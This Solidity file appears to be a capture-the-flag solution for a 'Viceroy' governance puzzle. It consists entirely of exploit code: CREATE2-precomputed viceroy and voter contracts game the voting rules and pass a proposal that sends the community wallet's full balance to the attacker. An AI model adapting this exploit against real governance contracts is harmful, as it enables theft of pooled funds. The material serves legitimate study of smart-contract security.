// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Governance, CommunityWallet} from "./Viceroy.sol";

bytes32 constant viceroySalt = bytes32("viceroy salt");
bytes32 constant voterSalt = bytes32("voter salt");

contract GovernanceAttacker {
    using AttackerUtil for address;

    /**
     * We will appoint 2 viceroies, each viceroy will appoint 5 voters
     * so that, we will have 10 votes
     */
    function attack(address governance) external {
        // calculate the first viceroy's address
        address viceroy = address(this).calculateAddr(governance, viceroySalt, type(Viceroy).creationCode);
        Governance(governance).appointViceroy(viceroy, 1);
        new Viceroy{salt: viceroySalt}(governance);

        // depose the first viceroy, so that we can appoint the second one
        Governance(governance).deposeViceroy(viceroy, 1);

        // calculate an new salt for the second viceroy
        bytes32 secondSalt = bytes32(uint256(viceroySalt) + 1);
        viceroy = address(this).calculateAddr(governance, secondSalt, type(Viceroy).creationCode);
        Governance(governance).appointViceroy(viceroy, 1);
        new Viceroy{salt: secondSalt}(governance );

        (uint256 proposalId,) = governance.getProposalAndProposalId();
        Governance(governance).executeProposal(proposalId);
    }
}

contract Viceroy {
    using AttackerUtil for address;

    constructor(address governance) {
        (uint256 proposalId, bytes memory proposal) = governance.getProposalAndProposalId();
        (, bytes memory data) = Governance(governance).proposals(proposalId);

        if (data.length == 0) {
            Governance(governance).createProposal(address(this), proposal);
        }

        for (uint8 i; i < 5; i++) {
            bytes32 salt = bytes32(uint256(voterSalt) + i);

            address voter = address(this).calculateAddr(governance, salt, type(Voter).creationCode);
            Governance(governance).approveVoter(voter);

            new Voter{salt: salt}(governance );
        }
    }
}

contract Voter {
    using AttackerUtil for address;

    constructor(address governance) {
        (uint256 proposalId,) = governance.getProposalAndProposalId();

        // Voter's constructor will be called by viceroy
        Governance(governance).voteOnProposal(proposalId, true, msg.sender);
    }
}

library AttackerUtil {
    function calculateAddr(address factoryAddr, address governance, bytes32 salt, bytes memory creationCode)
        internal
        pure
        returns (address ret)
    {
        ret = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            factoryAddr,
                            salt,
                            keccak256(abi.encodePacked(creationCode, abi.encode(governance)))
                        )
                    )
                )
            )
        );
    }

    function getProposalAndProposalId(address governance)
        internal
        view
        returns (uint256 proposalId, bytes memory proposal)
    {
        address communityWallet = address(Governance(governance).communityWallet());

        proposal = abi.encodeWithSignature("exec(address,bytes,uint256)", tx.origin, "", communityWallet.balance);

        proposalId = uint256(keccak256(proposal));
    }
}
